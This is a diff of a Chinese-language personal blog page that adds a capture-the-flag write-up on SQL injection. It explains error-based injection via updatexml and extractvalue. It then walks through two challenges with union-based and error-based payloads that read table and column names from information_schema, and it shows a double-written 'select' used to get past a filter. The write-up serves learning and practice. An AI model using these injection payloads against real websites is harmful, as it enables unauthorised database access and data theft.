@@ -217,6 +217,10 @@ SQL注入
 <p>字符型注入
 在输入参数前后加了引号。若输入参数为1，查询语句为 <code class="verbatim">select * from table where id = &#39;1&#39;</code> 。可以通过补全引号后在后面加union，在最后加上#或者–+注释掉之后的内容。</p>
 </li>
+<li>
+<p>报错注入
+mysql中 <code class="verbatim">updatexml</code> 函数是用于更新xml文档的函数，语法是 <code class="verbatim">updatexml(目标xml文档, xml内路径, 更新的内容)</code> 第二个参数应该为合法的xpath路径，否则会报错同时输出传入的参数。可以用 <code class="verbatim">concat</code> 在语句前拼接一个 <code class="verbatim">&#39;~&#39;</code> 构造一个非法的xpath，系统会执行后面语句后返回结果，就变成了普通的字符型注入。</p>
+</li>
 </ul>
 <div id="outline-container-headline-5" class="outline-3">
 <h3 id="headline-5">
@@ -228,6 +232,16 @@ SQL注入-1
 <img src="/img/2021-12-29_sql1-tips.png" alt="/img/2021-12-29_sql1-tips.png" title="/img/2021-12-29_sql1-tips.png" /></p>
 <p>
 可以看出是字符形式的注入。执行 <code class="verbatim">select * from notes where id =&#39;-1&#39; union select 1,2, group_concat(table_name) from information_schema.tables where table_schema=database()#&#39;</code> 获取表名，查到有个表 <code class="verbatim">fl4g</code> 。要注意select出来的个数必须为3，直接 <code class="verbatim">select *</code> 查不到东西。应该是后台过滤了参数必须为3个，并且只有后面两个会显示，所以查出来的 <code class="verbatim">table_name</code> 也要用 <code class="verbatim">group_concat</code> 合并为一个字段。拿到表名后执行 <code class="verbatim">select * from notes where id =&#39;4&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#39;fl4g&#39; #&#39;</code> 获取到列名为fllllag。最后执行 <code class="verbatim">select * from notes where id = &#39;4&#39; union select 1,2,fllllag from fl4g</code> 就能获取flag。</p>
+</div>
+</div>
+<div id="outline-container-headline-6" class="outline-3">
+<h3 id="headline-6">
+SQL注入-2
+</h3>
+<div id="outline-text-headline-6" class="outline-text-3">
+<p>看源码发现提示，参数加入 <code class="verbatim">&amp;tips=1</code> 的时候会返回报错信息，是报错注入，如果不加提示就是基于时间的盲注。先来看用提示的。</p>
+<p>
+随便输入用户名会提示账号不存在，用户名输admin提示账号或密码错误。注入点在用户名。执行 <code class="verbatim">name=admin&#39; and (select extractvalue(1,concat(0x7e,(database()))))--+&amp;pass=123</code> 拿到库名 <code class="verbatim">note</code> ， <code class="verbatim">name=admin&#39; and extractvalue(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema = &#39;note&#39;))--+&amp;pass=123</code> 拿表名。看错误提示猜测 <code class="verbatim">select</code> 被过滤了，用双写 <code class="verbatim">selselectect</code> 替换 <code class="verbatim">select</code> 拿到表名 <code class="verbatim">fl4g</code> 。 <code class="verbatim">name=admin&#39; and (selselectect extractvalue(1,concat(0x7e,(seleselectct group_concat(column_name) from information_schema.columns where table_name = &#39;fl4g&#39;))))--+&amp;pass=123</code> 拿到列名 <code class="verbatim">flag</code> ， <code class="verbatim">name=admin&#39; and(select extractvalue(1,concat(0x7e,(selselectect group_concat(flag) from fl4g))))--+&amp;pass=123</code> 拿到flag。</p>
 </div>
 </div>
 </div>
@@ -277,6 +291,8 @@ SQL注入-1
 <li><a href="#headline-4">SQL注入</a>
 <ul>
 <li><a href="#headline-5">SQL注入-1</a>
+</li>
+<li><a href="#headline-6">SQL注入-2</a>
 </li>
 </ul>
 </li>
@@ -607,7 +623,7 @@ SQL注入-1
 
   <section class="ui bottom attached center aligned segment">
     
-      <p>© 2021 Iluvata&#39;s Blog</p>
+      <p>© 2021 - 2022 Iluvata&#39;s Blog</p>
     
 
     <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> with theme <a href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</p>
